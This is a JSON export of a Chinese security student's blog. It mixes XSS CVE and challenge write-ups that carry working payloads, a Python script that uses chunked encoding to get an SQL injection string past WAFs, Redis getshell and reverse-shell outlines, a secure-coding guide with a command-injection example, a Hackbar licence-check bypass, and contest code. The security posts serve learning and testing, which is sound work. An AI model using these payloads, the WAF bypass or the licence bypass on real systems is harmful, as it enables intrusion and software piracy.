{"meta":{"title":"p7e4","subtitle":null,"description":"p7e4's blog","author":"p7e4","url":"https://p7e4.js.org","root":"/"},"pages":[{"title":"","date":"2020-08-12T13:32:33.978Z","updated":"2020-08-12T13:32:33.978Z","comments":true,"path":"404.html","permalink":"https://p7e4.js.org/404.html","excerpt":"","text":"404"},{"title":"about","date":"2020-08-12T13:32:33.978Z","updated":"2020-08-12T13:32:33.978Z","comments":true,"path":"about.html","permalink":"https://p7e4.js.org/about.html","excerpt":"","text":"CTFer 某三无学校在读 2022届毕业生 奇安信打杂 锦行科技滑水 缺实习，地点广深 email: cDdlNEBxcS5jb20="}],"posts":[{"title":"DOM-based XSS in MyBB before 1.8.24(CVE-2020-17447,CVE-2020-15139)","slug":"mybb-dom-xss","date":"2020-08-10T12:21:51.000Z","updated":"2020-08-12T13:32:33.978Z","comments":true,"path":"2020/08/10/mybb-dom-xss/","link":"","permalink":"https://p7e4.js.org/2020/08/10/mybb-dom-xss/","excerpt":"","text":"今早查看邮件注意到MyBB爆出了一个XSS漏洞，跟进看一看 相关信息 公开时间: 2020.8.9 影响版本: &lt;1.8.24 复现环境: https://mybb.com/versions/1.8.23/ 分析从CVE的两条References里 https://blog.mybb.com/2020/08/09/mybb-1-8-24-released-security-release/ https://github.com/mybb/mybb/security/advisories/GHSA-37h7-vfv6-f8rj 可以了解到这是SCEditor(论坛的文本编辑器)在将[align], [size], [quote], 和 [font] 伪标签转换为HTML预览时没有过滤特殊字符导致的DOM XSS复现就很简单了在有编辑器的地方用源文本模式插入[align=1&quot;&gt;&lt;svg/onload=alert(/xss/)&gt;&lt;&quot;]test[/align]再预览或提交后再编辑即可触发利用的话需要在有这个编辑器的时候才能自动触发，比如后台查看用户签名或站内消息，不过需要再点预览才能触发了 修复1.8.24版本已修复该问题升级到最新版本即可","categories":[],"tags":[]},{"title":"培训体系之WEB安全","slug":"web-training","date":"2020-07-30T16:36:11.000Z","updated":"2020-08-12T13:32:33.978Z","comments":true,"path":"2020/07/30/web-training/","link":"","permalink":"https://p7e4.js.org/2020/07/30/web-training/","excerpt":"","text":"Web安全WEB基础知识 协议基础 tcp/ip URL、域名与DNS HTTP协议介绍 请求方法 各字段功能 状态码 参数 跳转 cookie/session 编码 etc… HTTPS实现原理 相关工具 hackbar Fiddler Burp Suite基本使用 https抓包配置 环境搭建 虚拟机 PHP(mysql) DVWA ASPX(mssql) JSP (Node.js) (Flask Django) 数据库 关系型数据库简介 mysql安装配置、基本命令 SQL基础、相关函数 相关工具 phpmyadmin navicat (PHP语言基础) 基础语法，为后续理解漏洞原理准备 信息收集搜索引擎 常规搜索语法 敏感文件 空间搜索引擎 资产相关 域名信息 Whois 备案信息 CDN 寻找真实IP SSL证书 解析记录 子域名 邮件头信息 空间搜索引擎 国外解析差异 扫描全网 源站信息泄露，如phpinfo 子域收集 利用搜索引擎 证书透明度 域传送漏洞 Passive DNS 页面内容爬虫 解析记录 Rapid7 Open Data 枚举 工具 OneForAll 网站信息 端口扫描 Nmap Zenmap RustScan masscan 指纹识别 响应头 HTML 错误页面/模式 静态资源 favicon.ico 图片/logo js/css robots.txt 目录特征 powered by xxx 相关工具 webanalyzer/rules TideFinger whatweb 目录扫描 备份文件 源代码泄露.git/.svn 压缩包 txt etc… 漏洞分类SQL注入 基本原理 SQLi-lab、DVWA演示 分类 字符型 数字型 搜索型 手工注入 方法 联合查询 报错 叠堆 盲注 布尔 时间 外带 (宽字节) 注入点 读写文件 getshell udf提权 二次注入 SQLmap使用 tamper os-shell实现 etc… 防范 过滤 预编译(参数化) 误使用 表列名不可用 XSS HTML/JS简介 cookie/session XSS原理 分类 反射型XSS 储存型XSS DOM XSS Blind XSS HTML 属性 事件 编码 CSP 同源策略 CORS/JSONP 拓展 XSS平台 修复建议 CSRF 原理 利用 xssor.io 防护 token referer samesite SSRF 简介 协议 redis利用 绕过 IP变换(进制、合并) xip.io URL解析不动 跳转 DNS Rebinding IDN IPv6 命令执行 高发场景 常见payload 分割; || | &amp;&amp; &amp; \\r\\n 换行 反引号 $() 回显技巧 反弹shell 外带 DNS HTTP 时间延迟 绕过 长度绕过 通配符 元字符 代码执行 文件包含 远程 本地 /proc/self/environ session 日志 其他上传点 上传临时文件极限包含 smb 文件上传 目录穿越 前端绕过 黑名单 解析漏洞 MIME验证 写htaccess 条件竞争 二次渲染 Windows命名特性 压缩包解压 信息泄露 web敏感信息 phpinfo 任意文件读取(下载) 目录穿越 PHP伪协议读取 备份文件 敏感文档等 令牌 外部信息泄露 Github 网盘 QQ群 其他三方平台 XXE 基本语法 DOS 任意文件读取 内网探测 目录枚举 外带 DOC/DOCX/SVG 模版注入 基础知识 常用payload: 49 寻找可利用的类 绕过 反转 拼接 chr 业务安全 &amp;&amp; 逻辑漏洞 爆破 验证码安全 终端差异 APP ios android WEB PC mobie 小程序 公众号 可识别(OCR) 重用 客户端回显 session为空 IP限制 伪造 X-Forward-For X-Real-IP 代理池 短信轰炸 弱口令 撞库 越权 水平 垂直 越权获取敏感信息 电话 身份证 密码-照片 etc… 支付逻辑 修改 价格 数量 总金额 重放 条件竞争 注册 覆盖 验证绕过 任意密码重置 任意URL跳转 通用Bypass waf技巧 waf探测/识别 Fuzzing方法 畸形数据包 http/1.1分块传输 参数污染 SQL 注释 文件上传 等价替换 无字母webshell 编码/加密 其他资源 站点 漏扫 msf awvs xray burp goby webshell管理 菜刀 antSword 冰蝎","categories":[],"tags":[]},{"title":"requests分块传输","slug":"requests_chunk","date":"2020-07-23T22:15:06.000Z","updated":"2020-08-12T13:32:33.978Z","comments":true,"path":"2020/07/23/requests_chunk/","link":"","permalink":"https://p7e4.js.org/2020/07/23/requests_chunk/","excerpt":"","text":"1.分块传输 绕waf利用的是很多waf本身甚至就不支持分块传输，其次是支持不完善，在数据长度的后面还是可以加注释的，比如1;asd、1;asd=123 2.内容拆分的几种方法按敏感关键词名单拆分这也是sqlmap目前的使用的方法 但对于其他场景，需要手动扩展名单就有点麻烦 按某个特定标识符拆分比如在内容中找到@chunk@就以此为界限将两边内容放在不同的方块中 按位拆分比如每一个或两个字符就为一个分块，过长可能无法切分到敏感关键词，过短分块后的数据包体积就会翻N倍，但一般情况下我觉的这是可以接受的:smile:，所以最后使用了这种方法。 3.requests 实现requests是不支持请求包分块传输的，而且我们也没有办法控制Content-Type头，但好在实际上Transfer-Encoding的优先级是比Content-Type高的，也就是说两者同时存在时，服务器会默认忽略Content-Type，所以这里也就暂时可以先忽略这个问题了。 12345678910111213141516171819202122232425import requestsdef chunk(url, **data): headers = &#123; \"Transfer-Encoding\": \"chunked\", &#125; if data.get(\"headers\"): data[\"headers\"].update(headers) else: data[\"headers\"] = headers post = \"\" for i in data[\"data\"]: post += f\"1;a=1\\r\\n&#123;i&#125;\\r\\n\" data[\"data\"] = f\"&#123;post&#125;0\\r\\n\\r\\n\" return requests.post(url,**data)data = \"id=1 and union select 1,2,3 from \"if __name__ == '__main__': r = chunk(\"http://www.httpbin.org/post\", data=data) print(r.text)","categories":[],"tags":[]},{"title":"python socket recv()","slug":"py_socket_feature","date":"2020-06-27T20:48:17.000Z","updated":"2020-08-12T13:32:33.978Z","comments":true,"path":"2020/06/27/py_socket_feature/","link":"","permalink":"https://p7e4.js.org/2020/06/27/py_socket_feature/","excerpt":"","text":"最近在写一个简单的http库arequest用的socket，同时，对于较大的响应包，在HTTP/1.1中服务器通常会用分块传输(对，就是那个可以绕waf的那个分快传输)，详见Transfer-Encoding 即首行是一个16进制数表示接下来一段数据的长度（长度不包括两者后面的\\r\\n），然后下一行又是一个16进制的长度，直到0为止说明后面不再有数据了绕waf就是利用可以在每个块的长度后面写别名，而waf又没有对这里做正确处理的时候，就会导致敏感关键词被分割 再说回socket，在分块传输的时就要根据长度来recv，然而当我几轮recv后报错了ValueError: invalid literal for int() with base 16: &#39;xxxxxx&#39;当时还以为是网站问题，后来折腾了一下干脆直接recv()全读出来手调了一下，确实没问题，然后把读取的长度和实际读取长度对比了一下，结果不一样…翻一下文档 bufsize 指定一次接收的最大数据量 也就是说因为网络问题，实际收到多少就是多少了比如你recv(4096)实际可能只能收到1300多 解决方案: 放到io.BytesIO里面读","categories":[],"tags":[]},{"title":"一起来玩一些BAT的XSS实例","slug":"bat_xss","date":"2020-06-26T14:08:11.000Z","updated":"2020-08-12T13:32:33.978Z","comments":true,"path":"2020/06/26/bat_xss/","link":"","permalink":"https://p7e4.js.org/2020/06/26/bat_xss/","excerpt":"","text":"今天看先知看到了这个https://xz.aliyun.com/t/7909顺便玩了一下，做下记录 1http://px1624.sinaapp.com/test/xsstest1/没给参数，看下源码 123456&lt;script type=\"text/javascript\"&gt;var x=location.hash;function aa(x)&#123;&#125;;setTimeout(\"aa('\"+x+\"')\",100);&lt;/script&gt;Give me xss bypass 1~ dom型，闭合前后即可http://px1624.sinaapp.com/test/xsstest1/#&#39;);alert(&#39;1ps: 要在新标签页打开，因为锚的关系 2http://px1624.sinaapp.com/test/xsstest2/ 12345678910111213141516171819&lt;html&gt;&lt;head&gt;&lt;script src=\"./jquery-3.4.1.min.js\"&gt;&lt;/script&gt;Give me xss bypass 2~&lt;div style='display:none' id='xx'&gt;&amp;lt;img src=x onerror=alert(1)&amp;gt;&lt;/div&gt;&lt;input type='button' value='test' onclick='alert(\"å“ˆå“ˆï¼Œç‚¹è¿™çŽ©æ„æ²¡å•¥ç”¨çš„ï¼\")'&gt;&lt;body&gt;&lt;script&gt; var query = window.location.search.substring(1); var vars = query.split(\"&amp;\"); if(vars)&#123; aa(vars[0],vars[1]) &#125; function aa(x,y)&#123; $(\"#xx\")[x]($(\"#xx\")[y]()); &#125;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; jquery操作，先看看有哪些方法可以用然后明显注意到了html和texthttp://px1624.sinaapp.com/test/xsstest2/?html&amp;text 3http://px1624.sinaapp.com/test/xsstest3/ 12345678910Give me xss bypass 3~&lt;script src=\"./jquery-3.4.1.min.js\"&gt;&lt;/script&gt;&lt;script&gt; $(function test() &#123; var px = ''; if (px != \"\") &#123; $('xss').val(''); &#125; &#125;)&lt;/script&gt; 看完代码一脸懵逼，因为前两题的惯性，还以为是jquery这个版本有问题，最后试了一下才知道px是可控参数（反射性XSS）URL: http://px1624.sinaapp.com/test/xsstest3/?px=payload 12345678910Give me xss bypass 3~&lt;script src=\"./jquery-3.4.1.min.js\"&gt;&lt;/script&gt;&lt;script&gt; $(function test() &#123; var px = 'payload'; if (px != \"\") &#123; $('xss').val('payload'); &#125; &#125;)&lt;/script&gt; 那这里的问题在于有两个输出点，按常规思路逃逸出来后就无法闭合第二处的括号，这和我之前发的那个XSS有点像，但又有些差别这里虽然没有后续的注释可以闭合多行注释，但是因为第一处输出点在引号内，我们可以把单行注释隐藏在字符串中，在后面用它来消除/*的影响URL: http://px1624.sinaapp.com/test/xsstest3/?px=1*/alert(1);a={1:1//%27;/* 1234567$(function test() &#123; var px = '1*/alert(1);a=&#123;1:1//';/*'; if (px != \"\") &#123; $('xss').val('1*/alert(1);a=&#123;1:1//';/*'); &#125;&#125;)` 后来看了wp,发现大家都是用运算符做的1&#39; * alert(1) * &#39;1 4http://px1624.sinaapp.com/test/xsstest4/前一题的加强版，过滤了运算符和注释，没做出来，看了下wp，有两种解法： 模板字符串URL: 12345678910111213141516171819202122232425- `in`和`instanceof`[运算符](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators#%E5%85%B3%E7%B3%BB%E8%BF%90%E7%AE%97%E7%AC%A6)URL: `http://px1624.sinaapp.com/test/xsstest4/?px=%27%20in%20alert(1)%20in%20%27`## 5http://px1624.sinaapp.com/test/xsstest5/ 进去直接跳转到`http://px1624.sinaapp.com/test/xsstest5/user.php?callback=Give%20me%20xss%20bypass~`没有过滤，输入标签不解析，就知道有问题了，一看`Content-Type`果然 ![](https://i.loli.net/2020/06/25/OmUDzBlkXoTEptx.png) 这里是不会解析的，再回去看一下请求包 ``` html&lt;html&gt;&lt;script src=&quot;../jquery-3.4.1.min.js&quot;&gt;&lt;/script&gt;&lt;Script src=&quot;./index.js&quot;&gt;&lt;/Script&gt;&lt;head&gt;&lt;script type=&quot;text/javascript&quot;&gt;var orguin = $.Tjs_Get(&apos;uin&apos;);var pagenum= $.Tjs_Get(&apos;pn&apos;);if(orguin&lt;=0) window.location=&quot;./user.php?callback=Give me xss bypass~&quot;;document.write(&apos;&lt;script type=&quot;text/javascript&quot; src=&quot;http://px1624.sinaapp.com/&apos;+orguin+&apos;?&apos;+pagenum+&apos;&quot;&gt;&lt;\\/script&gt;&apos;);&lt;/script&gt;&lt;/head&gt;&lt;body&gt;Give me xss bypass 5~&lt;/body&gt;&lt;/html&gt; 翻一下index.js 12345678910111213141516171819202122232425262728293031323334353637383940// 得到地址栏中的参数值 变量分大小写Tjs_Get:function(parmtname)&#123; //var SERVER_TEMP = $.Tjs_HtmlEncode(window.location.search.replace(/.*\\?/,&quot;&quot;)); //HtmlEncode 进行安全验证 var sl = location.href.indexOf(&apos;&amp;&apos;); var hl = location.href.indexOf(&apos;#&apos;); var str = &apos;&apos;; if ((sl &lt; 0 || sl &gt; hl) &amp;&amp; hl &gt; 0) str = location.hash.substr(1); else str = location.search.substr(1); str=str.replace(/%/g,&quot;&quot;); //var SERVER_TEMP = str; var SERVER_TEMP = $.Tjs_HtmlEncode(str.replace(/.*\\?/,&quot;&quot;)); //HtmlEncode 进行安全验证 var PAGE_PARMT_ARRAY = SERVER_TEMP.split(&quot;&amp;amp;&quot;); if(PAGE_PARMT_ARRAY.length==0) return &quot;&quot;; var value=&quot;&quot;; for(var i=0;i&lt;PAGE_PARMT_ARRAY.length;i++)&#123; if(PAGE_PARMT_ARRAY[i]==&quot;&quot;) continue; var GETname = PAGE_PARMT_ARRAY[i].substr(0,PAGE_PARMT_ARRAY[i].indexOf(&quot;=&quot;)); if(GETname == parmtname)&#123; value = PAGE_PARMT_ARRAY[i].substr((PAGE_PARMT_ARRAY[i].indexOf(&quot;=&quot;)+1),PAGE_PARMT_ARRAY[i].length); return value; break; &#125; &#125; return &quot;&quot;;&#125;,//html正文编码：对需要出现在HTML正文里(除了HTML属性外)的不信任输入进行编码Tjs_HtmlEncode:function (sStr)&#123; sStr = sStr.replace(/&amp;/g,&quot;&amp;amp;&quot;); sStr = sStr.replace(/&gt;/g,&quot;&amp;gt;&quot;); sStr = sStr.replace(/&lt;/g,&quot;&amp;lt;&quot;); sStr = sStr.replace(/&quot;/g,&quot;&amp;quot;&quot;); sStr = sStr.replace(/&apos;/g,&quot;&amp;#39;&quot;); return sStr;&#125; 这里过滤了双引号且过滤了%无法编码绕过，既然无法逃逸出src属性，那就只能控制加载的js了，刚好利用前面的那个接口URL: http://px1624.sinaapp.com/test/xsstest5/?uin=test/xsstest5/user.php&amp;pn=callback=alert(1) 6http://px1624.sinaapp.com/test/xsstest6/ 123456789101112131415&lt;html&gt;&lt;script src=\"../jquery-3.4.1.min.js\"&gt;&lt;/script&gt;&lt;Script src=\"./index.js\"&gt;&lt;/Script&gt;&lt;head&gt;&lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /&gt;&lt;script type=\"text/javascript\"&gt;var orguin = $.Tjs_Get('uin');if(orguin&lt;=0) window.location=\"./user.php?callback=\";document.write('&lt;script type=\"text/javascript\" src=\"http://px1624.sinaapp.com/pxpath/'+decodeURIComponent(orguin)+'&amp;'+Math.random()+'\"&gt;&lt;\\/script&gt;');&lt;/script&gt;&lt;/head&gt;&lt;body&gt;Give me xss bypass 6~【任意浏览器弹1就算通过】&lt;/body&gt;&lt;/html&gt; 也是前一题的加强版，不同的是输出没有了问号，导致无法正确向user.php传递callback参数，且user.php的callback限制最长七位这里比较明显的多了一行&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;这说明答案可能和编码有关?没解出来做等wp~ 7http://px1624.sinaapp.com/test/xsstest7/?px=payload 123456789&lt;script&gt;var px='payload';&lt;/script&gt;give me xss by pass~7&lt;div style=\"display:none\"&gt;payload&lt;/div&gt;&lt;!--px--&gt;&lt;script&gt;'px'&lt;/script&gt; 两个输出点，JS内的特殊字符前面加\\进行转移，另一个转义了尖括号，但是\\本身是没有转义的，于是可以用\\转义&#39;的反斜线从而进行逃逸但是这样既没有办法闭合也没有办法注释掉后面的单引号用模板字符串试一下结果SyntaxError: `` literal not terminated before end of script看来模板字符串不能跨script，后来用注释试了一下也不行，就跑去看wp了，wp也是用注释做的，不过里面又内嵌了一个&lt;script&gt;详见HTML5 + JS EscapersURL: http://px1624.sinaapp.com/test/xsstest7/?px=\\%27%20*%20`%20*%20alert(1)//%3C!--%20\\%3Cscript%20%3E 后面两题都是第八题的加强版，都做不出来，太难了我…就解了前三题","categories":[],"tags":[]},{"title":"2020年远光杯粤澳计算机程序设计大赛网络资格赛","slug":"2020ygb-acm","date":"2020-04-25T20:32:00.000Z","updated":"2020-08-12T13:32:33.978Z","comments":true,"path":"2020/04/25/2020ygb-acm/","link":"","permalink":"https://p7e4.js.org/2020/04/25/2020ygb-acm/","excerpt":"","text":"Alice的秘密 12345678910111213141516171819202122232425262728293031323334353637383940414243444546import sysimport codecssys.stdout = codecs.getwriter(\"utf-8\")(sys.stdout.detach())from datetime import datetimewhile True: try: n = input() s = input() except: break else: if len(s) &gt; 128: print(\"none\") continue elif len(n) == 0: break try: if not 1900 &lt;= datetime.strptime(n, '%Y%m%d').year &lt;= 2020: print(\"none\") continue except ValueError: print(\"none\") continue while int(n) &gt;= 10: n = str(sum(map(int, list(n)))) n = int(n) an = '' for i in s: if i&gt;='a' and i&lt;='z': i=ord(i) i = (i + n - 97) % 26 + 97 i = chr(i) elif i &gt;= \"A\" and i &lt;= \"Z\": i = ord(i) i = (i + n - 65) % 26 + 65 i = chr(i) elif ord(i) == 32: i = \"#\" else: break an += i if len(an) == len(s): print(an) else: print(\"none\") 今天星期几需要注意年是不合法的y(2000&lt;=y&lt;=1000000) 1234567891011121314151617181920212223import sysimport codecssys.stdout = codecs.getwriter(\"utf-8\")(sys.stdout.detach())from datetime import datetimewhile True: try: y, m, d = map(int, input().split()) except: break else: if y &gt;= 10000: x = (y // 2000 - 2) * 730485 y %= 2000 + 4000 else: x = 0 firstDay = datetime(2000,1,1) endDay = datetime(y,m,d) x += (endDay - firstDay).days + 5 if x % 4 == 0: print((x // 4) - 1, 4) else: print(x // 4 , x % 4) 小明的英文作业一开始以为每组数据是要合在一起的，浪费好多时间 123456789101112131415161718from collections import Counter while True: s = input() if s != \"#\": a = s.split() an = [] for k, v in Counter(a).items(): if v == 1: an.append(k) dl = len(a) ds = len(an) if ds * 2 &lt; dl or dl &gt; 100: print(\"no\") else: print(\"yes\") else: break 分三排 123456789101112131415161718s = int(input())data = input().split()d2 = []d1 = []d0 = []t = 1for i in data: if t % 3 == 0: d0.append(i) elif t % 3 == 1: d2.append(i) elif t % 3 == 2: d1.append(i) t += 1print(\" \".join(d2))print(\" \".join(d1))print(\" \".join(d0)) 击中目标一看就是难题，没做 序列计数不会 强迫症 123456from collections import Counters = input()data = map(int, input().split())c = Counter(data)print(c.most_common(1)[0][0]) 新型冠状爱情病毒不会+1 期末表彰 123456789101112s = int(input())data = []for i in range(s): f = &#123;\"num\": i + 1&#125; f[\"c\"], f[\"math\"], f[\"eng\"] = map(int, input().split()) f[\"sum\"] = f[\"c\"] + f[\"math\"] + f[\"eng\"] data.append(f)an = sorted(data, key = lambda i: (i['sum'], i['c']), reverse=True)for i in range(5): pr = [str(an[i][\"num\"]), str(an[i][\"c\"]), str(an[i][\"math\"]), str(an[i][\"eng\"])] print(\" \".join(pr)) 最小特征 1234567891011121314151617181920212223242526import mathx = int(input())for i in range(x): s = list(map(int, list(input()))) data = [s[0:3],s[3:6],s[6:9]] ans = [] for cs in range(4): l = &#123;&#125; l[1] = data[0][0] l[2] = data[0][1] l[3] = data[0][2] l[4] = data[1][2] l[5] = data[2][2] l[6] = data[2][1] l[7] = data[2][0] l[8] = data[1][0] c = data[1][1] an = 0 for k in range(1,9): an += (c ^ l[k]) * int(math.pow(2, 8-k)) ans.append(an) data = list(zip(*data[::-1])) print(min(ans)) 最后赶的一题，可惜有一个样例超时了 项目管理 捕鱼达人 排除危险 图像编码问题 军训值日生 1234567891011121314151617181920import sysimport codecssys.stdout = codecs.getwriter(\"utf-8\")(sys.stdout.detach())while True: try: n = int(input()) mi = list(map(int, input().split())) except: break else: mi.sort() c = 0 for i in range(n-1): a = mi.pop(0) c += mi[0] * a mi[0] += a mi.sort() print(c) 今天图书馆开了没？ 小明的体育课 12345678910111213141516171819import sysimport codecssys.stdout = codecs.getwriter(\"utf-8\")(sys.stdout.detach())while True: try: n = int(input()) except: break else: i = 2 a = &#123; 0: 1, 1: 1, &#125; while i &lt;= n: a[i] = a[i-1] + a[i-2] i += 1 print(a[n]) 孤独的字符串 鲍勃的输入法 一起做课件","categories":[],"tags":[]},{"title":"Redis getshell的几种方法","slug":"redis_getshell","date":"2020-04-18T11:31:09.000Z","updated":"2020-08-12T13:32:33.978Z","comments":true,"path":"2020/04/18/redis_getshell/","link":"","permalink":"https://p7e4.js.org/2020/04/18/redis_getshell/","excerpt":"","text":"Redis getshell的几种方法 写文件 写authorized_keys 写corntab 写/etc/passwd 写网站目录获取webshell 主从复制","categories":[],"tags":[]},{"title":"北师珠ACM题库刷题记录","slug":"bsz_acm","date":"2020-04-04T11:12:59.000Z","updated":"2020-08-12T13:32:33.978Z","comments":true,"path":"2020/04/04/bsz_acm/","link":"","permalink":"https://p7e4.js.org/2020/04/04/bsz_acm/","excerpt":"","text":"莫名其妙被拉到一个acm比赛，那就试着刷一下题吧-_- 怡姐的游戏 12345678910111213s = int(input().strip())for i in range(s): a, b = input(), input() x = y = 1 for x1 in a: x *= ord(x1) - 64 for y1 in b: y *= ord(y1) - 64 answer = \"Yes\" if x % 57 == y % 57 else \"No\" print(\"Case #&#123;&#125;:\".format(i+1)) print(answer) nsy上初中 1234567s = int(input().strip())for i in range(s): n = int(input().strip()) answer = \"yjznb!\" if n else \"nsynb!\" print(\"Case #&#123;&#125;:\".format(i+1)) print(answer) 不知道运行错误是什么情况，感觉是输入有问题(疯狂甩锅) The World 砸瓦鲁多n个数分成m组 求所有组元素和的最小值emmm，不会 题到签 1234567s = int(input().strip())for i in range(s): a, b, c = [int(x) for x in input().split()] ans = min(a,b-c,c) - min(a,b,b-c) + min(a-b,b,c) print(\"Case #&#123;&#125;:\".format(i+1)) print(\"&#123;:.2f&#125;\".format(ans)) 我要看憨色直播迷宫问题，试了一下午，最后还是放弃挣扎 舔狗的心酸，不用你来拆穿有点迷，到点N的长度就是1 xor n?试了一下，还真就过了… 123456s = int(input().strip())for i in range(s): n = int(input()) print(\"Case #&#123;&#125;:\".format(i+1)) print(1 ^ n) 校队选拔从a,b,(a+b+c)/3中取最小的即可 12345678s = int(input().strip())for i in range(s): data = [int(x) for x in input().split()] data[0], data[1] = data[0], data[1] data[2] = (data[0] + data[1] + data[2]) / 3 print(\"Case #&#123;&#125;:\".format(i+1)) print(int(min(data))) nsy上高中n本书分给m个人，没有顺序C(n－1, m－1) = (n-1)! / (m-1)!(n-m)! 1234567891011121314s = int(input().strip())for i in range(s): n, m = [int(x) for x in input().split()] tmp1, tmp2 = 1, 1 for x in range(m, n): tmp1 *= x for x in range(1, n-m+1): tmp2 *= x answer = int(tmp1 / tmp2) if answer &gt; 10 ** 12: answer = 10 ** 12 print(\"Case #&#123;&#125;:\".format(i+1)) print(answer) 不过还是超时了，不知道还能怎么优化 我有病，你有药吗？偷个懒，用Pyhon的bin函数直接转换为二进制 12345s = int(input().strip())for i in range(s): print(\"Case #&#123;&#125;:\".format(i+1)) print(len(str(bin(int(input()))).replace(\"0\",\"\")) - 1) 单身狗也想要凑对2019可以分解为3 x 673，然后求倍数应该就行了，但我算的答案不对…暴力是可行的，但是太花时间 暗恋的密码这题我会 123456789101112import res = int(input().strip())for i in range(s): data = input().strip() data = re.split(r\"\\[|\\]\", data) for x in range(1,len(data),2): data[x] = re.sub(r\"\\d\",\"\",data[x]) * int(re.sub(r\"\\D\",\"\",data[x])) print(\"Case #&#123;&#125;:\".format(i+1)) print(\"\".join(data))","categories":[],"tags":[]},{"title":"一处有趣的反射型XSS","slug":"a_xss","date":"2020-02-14T21:46:25.000Z","updated":"2020-08-12T13:32:33.978Z","comments":true,"path":"2020/02/14/a_xss/","link":"","permalink":"https://p7e4.js.org/2020/02/14/a_xss/","excerpt":"","text":"一处有趣的反射型XSS 环境页面源码： 1234567891011121314151617181920212223...function A()&#123; //func('/xxxxxxxx?id=xss_payload'); window.location = $url(\"/abc?id=xss_payload\");&#125;function B()&#123; func(\"xss_payload\");&#125;...function C(action)&#123; func ( \"xss_payload\", \"\", null, );&#125;... 一个参数在页面的有4处输出点，都将双引号转义掉了那么如何利用呢，既然第一处没有任何过滤就先从第一处下手通过换行符%0a进行换脱离当前注释行%0aalert(&quot;xss&quot;);//然后代码就变成了这样 12345678910111213141516171819202122232425function A()&#123; //func('/xxxxxxxx?id= alert(\"xss\")//'); window.location = $url(\"/abc?id= alert(\"xss\")//\");&#125;function B()&#123; func(\" alert(\"xss\")//\");&#125;...function C(action)&#123; func ( \" alert(\"xss\")//\", \"\", null, );&#125; 虽然第一处看起来没有问题了，但是后面的三处都因为首双引号没有闭合导致报错，payload也无法执行SyntaxError: &quot;&quot; string literal contains an unescaped line break因为双引号被过滤了，我们没有办法闭合双引号那尝试一下多行注释?/**/构造payload: %0A/**/alert(&quot;xss&quot;);/* 12345678910111213141516171819202122232425function A()&#123; //func('/xxxxxxxx?id= /**/alert(\"xss\");/*'); window.location = $url(\"/abc?id= /**/alert(\"xss\");/*\");&#125;function B()&#123; func(\" /**/alert(\"xss\");/*\");&#125;...function C(action)&#123; func ( \" /**/alert(\"xss\");/*\", \"\", null, );&#125; 这样看上去就ok了，乍一看最后一个/*还没有闭合，但是我得到的报错是SyntaxError: missing } after function继续往后看，这是因为后面还有注释刚好闭合掉了 12345678910.../** * 描述xxxxxxxxxxxxx * @id 事件id */function H(id)&#123; ...&#125;... 然后在%0a后加入}进行闭合 12345678910111213141516171819202122232425function A()&#123; //func('/xxxxxxxx?id= &#125;/**/alert(\"xss\");/*'); window.location = $url(\"/abc?id= &#125;/**/alert(\"xss\");/*\");&#125;function B()&#123; func(\" &#125;/**/alert(\"xss\");/*\");&#125;...function C(action)&#123; func ( \" &#125;/**/alert(\"xss\");/*\", \"\", null, );&#125; 连弹4次框，（代码高亮有点小问题）","categories":[],"tags":[]},{"title":"安全编码规范","slug":"sec_code","date":"2020-01-16T23:46:25.000Z","updated":"2020-08-12T13:32:33.978Z","comments":true,"path":"2020/01/16/sec_code/","link":"","permalink":"https://p7e4.js.org/2020/01/16/sec_code/","excerpt":"","text":"前言(本文仅供参考，如有疏漏概不负责)漏洞的产生有一个核心的点就是可控参数进入到了敏感函数 可控参数不仅仅指用户直接提交的内容，还包括间接可控的情况，比如一次写入到数据库，二次再取出来的情况就属于间接可控所以开发安全第一要义是: 不要相信一切来自用户的输入！！！ 以下据根据历史工单漏洞数排序 XSS后端同学注意设置接口的Content-Type为JSON模板可控参数请先用htmlspecialchars等进行转义此外，还可设置httponly和加CSP等进行进一步加固 SQL注入错误示范： 1234$id = $_REQUEST[\"id\"];...$sql = \"SELECT coloum FROM table where id = \" . $id;... SQL注入注意使用参数化查询(预编译也行)即可，除非参数可控，不然一般不要偷懒用拼接的方式正确写法： 1$this-&gt;db.fetchone(&quot;SELECT coloum FROM table where id = ?&quot;, $id); OS命令注入shell_exec(&quot;nslookup &quot;$_GET[&#39;domain&#39;]&quot;);根据业务需要使用正则等方式校验内容，特别是符号在PHP中可使用escapeshellcmd(arg)进行过滤，需要注意的是escapeshellcmd不转义匹配的单引号导致参数可控 CSRF稍微成熟一点的框架都会有CSRF(Token)的相关内容开发同学请多读一下官方文档即可 越权这个也没啥好说的，做好权限控制划分，敏感操作先鉴权不要依赖前端校验 其他特别的漏洞遇到的暂时比较少，有特别的再总结吧","categories":[],"tags":[]},{"title":"Hackbar 破解","slug":"hackbar","date":"2020-01-14T21:46:25.000Z","updated":"2020-08-12T13:32:33.978Z","comments":true,"path":"2020/01/14/hackbar/","link":"","permalink":"https://p7e4.js.org/2020/01/14/hackbar/","excerpt":"","text":"Hackbar会请求hackbar.site/ping/进行注册码验证有师傅做了个网站06m.me来返回验证成功所以改一下host就行149.129.101.18 hackbar.site","categories":[],"tags":[]},{"title":"红帽杯线下赛","slug":"2019redhat","date":"2019-11-24T21:46:25.000Z","updated":"2020-08-12T13:32:33.978Z","comments":true,"path":"2019/11/24/2019redhat/","link":"","permalink":"https://p7e4.js.org/2019/11/24/2019redhat/","excerpt":"","text":"昨天参加了2019红帽杯线下赛，比赛使用的是AWD PLUS赛制，这也是我第一次见到这种赛制 虽然叫AWD PLUS，其实我觉得应该改为CTF PLUS，因为实际上是解题模式，然后+修补过程 大致流程如下：1.选手攻破某一赛题，获取flag2.提交到平台，证明具有对该题攻击能力3.提交防御脚本，平台会运行exp和check，如果能check过且exp攻击失败则认为防御成功4.本题全部完成，继续做下一题 当然，这里还是有轮数的，30分钟一轮，平台会自动扣掉不具备某题防御能力的队伍分数然后平分给攻击方 所以一题只需要一解，相当于还是和出题人对抗Orz 